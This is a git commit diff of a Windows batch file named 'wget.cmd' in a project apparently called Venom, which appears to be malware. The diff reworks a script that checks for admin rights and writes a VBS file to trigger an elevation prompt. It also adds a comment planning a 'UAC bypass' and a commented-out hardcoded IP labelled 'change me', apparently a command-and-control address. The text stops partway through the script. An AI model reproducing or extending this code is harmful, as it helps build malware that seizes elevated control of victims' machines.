4cfaffeb9a828b28a2a26811cc9ac9ef242ae25c
pokemonunleashed <pokemonunlaeshed@proton.me>
2025-01-25 03:14:25 -0500

    SYS32

--- Venom/files/wget.cmd
+++ Venom/files/wget.cmd
@@ -1,22 +1,22 @@
-@REM get admin permissions for script
+@REM TODO: add UAC bypass dumbass
+
+@REM change me
+@REM set "EcSjRhAguo=45.61.56.252"
+
 @echo off
 :: BatchGotAdmin
-:--------------------------------------
-    IF "%PROCESSOR_ARCHITECTURES%" EQU "amd64" ( 
-    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-    ) ELSE (
-        >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe"
-        "%SYSTEMROOT%\system32\config\system"
-    )
-
-@REM --> if error flag set, we do not have admin.
+:-------------------------------------
+if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) else (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
 if '%errorlevel%' NEQ '0' (
-	echo Requesting administrative priviledges...
-	goto UACPrompt
+    echo Requesting administrative privileges...
+    goto UACPrompt
 ) else ( goto gotAdmin )
 
 :UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) >  "%temp%\getadmin.vbs"
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     set params= %*
     echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
 
